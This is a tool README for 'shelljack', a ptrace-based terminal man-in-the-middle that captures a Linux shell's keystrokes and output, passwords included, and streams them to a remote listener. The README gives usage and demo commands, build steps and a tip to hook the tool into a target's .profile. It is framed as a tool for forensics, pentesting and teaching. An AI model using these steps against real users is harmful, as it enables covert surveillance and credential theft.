# shelljack #

_shelljack_ is a [computer surveillance](http://en.wikipedia.org/wiki/Computer_surveillance) tool designed to capture [Linux](http://en.wikipedia.org/wiki/Linux) [command-line](http://en.wikipedia.org/wiki/Command_line) interactions in real-time.

**What exactly is "shelljacking"?**

This is the term I use to describe a [pseudo-terminal](http://en.wikipedia.org/wiki/Pseudo_terminal) [mitm attack](http://en.wikipedia.org/wiki/Man-in-the-middle_attack). This technique embeds the attacker between the target user and their [shell](http://en.wikipedia.org/wiki/Shell_%28computing%29). From this position the attacker is able to inspect and capture all [I/O](http://en.wikipedia.org/wiki/I/o) as it crosses the terminal. This is similar to a [keystroke logger](http://en.wikipedia.org/wiki/Keystroke_logging), but will also return the output from the command line as well. In addition to the data being captured, it is also forwarded to a [remote listener](http://en.wikipedia.org/wiki/Netcat) for analysis in real time. 

This embedded position allows the attacker to capture *all* of the traffic that crosses the terminal. *This includes child processes and ssh sessions to other hosts!*

**That's awesome! [1337 h4X0rZ rUL3!!](http://hackertyper.com/)**

While I do think it's pretty neat, this really isn't ["hacking"](http://en.wikipedia.org/wiki/Hacker_%28computer_security%29). There are no exploits here. _shelljack_ takes advantage of some Linux [deep magic](http://lxr.linux.no/#linux+v3.9.6/kernel/ptrace.c) that is completely legitimate, although often not well understood. In order to shelljack a target, you will need the appropriate permissions to do so. 

While this may not be a ["sploit"](http://en.wikipedia.org/wiki/Sploit), it is a very handy tool designed to empower [forensic analysts](http://en.wikipedia.org/wiki/Computer_forensics), [pentesters](http://en.wikipedia.org/wiki/Pentester), and educators.

**Is this a [kernel module](http://en.wikipedia.org/wiki/Kernel_module)?**

No. _shelljack_ is a [user space](http://en.wikipedia.org/wiki/User_space) tool.

**Do I need to be root to use it?**

No. You need "appropriate permissions". This means that you will need the ability to execute code on the target host either as root or as the target user. 

It should be noted that Ubuntu has shiped, since version 10.10, with a patch that restricts the scope of ptrace's effectiveness. Because of this, shelljack will need root privileges for in order to work on Ubuntu.

**When would I ever need this?**

* As a forensic analyist, you can use _shelljack_ to perform surveillance on the target of your investigation (after you've recieved the appropriate authority to do so from the heads of your Security, Legal, and HR teams, of course.)
* As a pentester who has gained execution as a user, you can now shelljack that account for further reconnaissance and credential harvesting.
* As a sysadmin, or other educator, _shelljack_ is useful for publicly demonstrating the importance of sane file permissions as well as other system configuration issues.

**How does it work?**

_shelljack_ is a [malicious](http://en.wikipedia.org/wiki/Malware) [terminal emulator](http://en.wikipedia.org/wiki/Terminal_emulator) that uses [ptrace](http://en.wikipedia.org/wiki/Ptrace) to insert itself between a shell and it's [controlling tty](https://github.com/emptymonkey/ctty).

**What Architectures / OSs will this run on?**

Currently, _shelljack_ will only run on x86_64 Linux. Because _shelljack_ uses the Linux ptrace interface to inject assembly language [syscalls](http://en.wikipedia.org/wiki/Syscall) into a target process, nothing here is portable. That said, check out my other project, [<i>ptrace_do</i>](https://github.com/emptymonkey/ptrace_do). If I get around to supporting <i>ptrace_do</i> for other architectures, then porting _shelljack_ shouldn't be too hard.

**Please tell me more about this [deep magic](http://en.wikipedia.org/wiki/Deep_magic) of which you speak!**

* ptrace is the debugging interface provided by the Linux kernel. It is a *very* powerful tool, and the aspiring hacker would do well to study it. The best introduction I've seen comes in the form of two articles by Pradeep Padala dating back to 2002: [Playing with ptrace, Part I](http://www.linuxjournal.com/article/6100) and [Playing with ptrace, Part II](http://www.linuxjournal.com/article/6210)

* A solid understanding of [tty](http://en.wikipedia.org/wiki/Tty_%28Unix%29) fundamentals is necessary to fully understand the Unix / Linux command line. The best tutorial on this topic is easily [The TTY demystified](http://www.linusakesson.net/programming/tty/) by [Linus Åkesson](http://www.linusakesson.net/pages/me.php). 

# Usage #

	empty@monkey:~$ shelljack --help
	usage: shelljack [-f FILE]|[-n HOSTNAME:PORT]|[-s UNIX_SOCKET] PID
        -f FILE                 Send the output to a FILE. (This is particularly useful with FIFOs.)
        -n HOSTNAME:PORT        Connect to the HOSTNAME and PORT then send the output there.
        -s UNIX_SOCKET          Connect to the UNIX_SOCKET then send the output there.
        PID                     Process ID of the target process.
        NOTE: One of either -f, -n, or -s is required.

In order to properly mitm the [signals](http://en.wikipedia.org/wiki/Unix_signal) generated by the controlling tty, _shelljack_ must detach from it's original launch terminal. Because of this, you'll need to set up a listener to catch its eavesdropped output. [Ncat](http://nmap.org/ncat/) works nicely for this. (We've chosen localhost and port 9999 here, but _shelljack_ will happily use any [address](http://linux.die.net/man/3/getaddrinfo) that the machine will route.)

Let's do a demo. I'll be running the [tty](http://linux.die.net/man/1/tty) command in these examples to demonstrate which terminal the various commands are being run in.

Start by setting up a listener:

	empty@monkey:~$ tty
	/dev/pts/0
	empty@monkey:~$ ncat -k -l localhost 9999

Since this is a demo, let's also examine the shell we want to target:

	empty@monkey:~$ tty
	/dev/pts/3
	empty@monkey:~$ echo $$
	19716
	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:18 255 -> /dev/pts/3

Now, launch _shelljack_ against the target shell:

	empty@monkey:~$ tty
	/dev/pts/2
	empty@monkey:~$ shelljack -n localhost:9999 19716

That was it! If we go back to the listener, we will now see all of the I/O come through the listener as it is typed into the target shell. For further evidence of this, lets examine the target shell again:

	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:17 0 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 1 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 2 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:18 255 -> /dev/pts/4
	empty@monkey:~$ ps j -u empty | grep $$
	19714 19716 19716 19716 pts/4    19867 Ss    1000   0:00 -bash
	    1 19782 19782 19782 pts/3    19782 Ss+   1000   0:00 shelljack localhost 9999 19716

We can see that _shelljack_ has successfully taken over /dev/pts/3, and is serving up /dev/pts/4 for the target shell to consume. It is now in place to collect the traffic and happily forward you a copy of everything it sees, including input which normally wouldn't be ["echoed"](http://linux.die.net/man/1/stty) to the terminal at all. (e.g. passwords)

Also note, _shelljack_ was designed with the ability to attack the shell that launches it. This makes it ideal to call from the target's login [configuration files](http://en.wikipedia.org/wiki/Unix_shell#Configuration_files_for_shells). (e.g. .profile)

	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:33 0 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 1 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 2 -> /dev/pts/3
	lrwx------ 1 empty empty 64 Jun 16 16:33 255 -> /dev/pts/3
	empty@monkey:~$ shelljack localhost:9999 $$
	empty@monkey:~$ ls -l /proc/$$/fd
	total 0
	lrwx------ 1 empty empty 64 Jun 16 16:33 0 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 1 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 2 -> /dev/pts/4
	lrwx------ 1 empty empty 64 Jun 16 16:33 255 -> /dev/pts/4

# Prerequisites #

To help with the heavy lifting, I've written two supporting libraries that are both needed by _shelljack_:

* [<i>ptrace_do</i>](https://github.com/emptymonkey/ptrace_do): A ptrace library for easy syscall injection in Linux.
* [_ctty_](https://github.com/emptymonkey/ctty): A library and tool for discovering and mapping of Controlling TTYs in Linux.

In addition, I've also written another tool that isn't needed by _shelljack_, but helps with tty forensics. 

* [_dumb_](https://github.com/emptymonkey/dumb): A simple tool for stripping control characters and escape sequences from terminal output in Unix/Linux.

# Installation #

	git clone https://github.com/emptymonkey/ptrace_do.git
	cd ptrace_do
	make
	cd ..

	git clone https://github.com/emptymonkey/ctty.git
	cd ctty
	make
	cd ..

	git clone https://github.com/emptymonkey/shelljack.git
	cd shelljack
	make

# Limitations #

As noted in the [tty_ioctl](http://linux.die.net/man/4/tty_ioctl) [manpage](http://en.wikipedia.org/wiki/Manpage), an existing process can only switch controlling ttys if it is a session leader. Because of this, while _shelljack_ will be successful against the shell itself, any *existing* child processes will not be able to switch with it. They won't usually die during the shelljacking, but their I/O will act strangely if it relies on the tty. It is best to target shells that are semi-idle, or attack them during the login process. Note that this only affects child processes that exist at the time of the attack. New processes will inherit their parents (shelljacked) [file descriptors](http://en.wikipedia.org/wiki/File_descriptor).

# Similar Works #

_shelljack_ is only the latest in a series of tools that can best be described as "Processes acting badly with ptrace." The most notable of these tools was [Metlstorm](https://twitter.com/Metlstorm)'s [ssh-jack](http://www.blackhat.com/presentations/bh-usa-05/bh-us-05-boileau.pdf) from 2005 which opened the door for this style of attack. Metlstorm's tool uses [Python](https://www.python.org/) and [GDB](http://www.sourceware.org/gdb/) scripts to tap into an active SSH session. The Ubuntu security team [added a patch](http://www.gossamer-threads.com/lists/linux/kernel/1239943) to reduce the attack surface represented by ptrace as a direct response to ssh-jack.

I also came across several other projects during my research that use similar techniques to explore both ptrace code injection as well as terminal mangling. If this is an area that interests you, these other projects are also worth studying.

* [retty](http://pasky.or.cz/dev/retty/) is a tiny tool that lets you attach processes running on other terminals.
* [neercs](http://caca.zoy.org/wiki/neercs) allows you to detach a session from a terminal.
* [injcode](https://github.com/ThomasHabets/injcode) injects code into a running process.
* [reptyr](http://blog.nelhage.com/2011/02/changing-ctty/) takes a process that is currently running in one terminal, and transplants it to a new terminal.

## A Quick Note on Ethics ##

I write and release these tools with the intention of educating the larger [IT](http://en.wikipedia.org/wiki/Information_technology) community and empowering legitimate pentesters. If I can write these tools in my spare time, then rest assured that the dedicated malicious actors have already developed versions of their own.

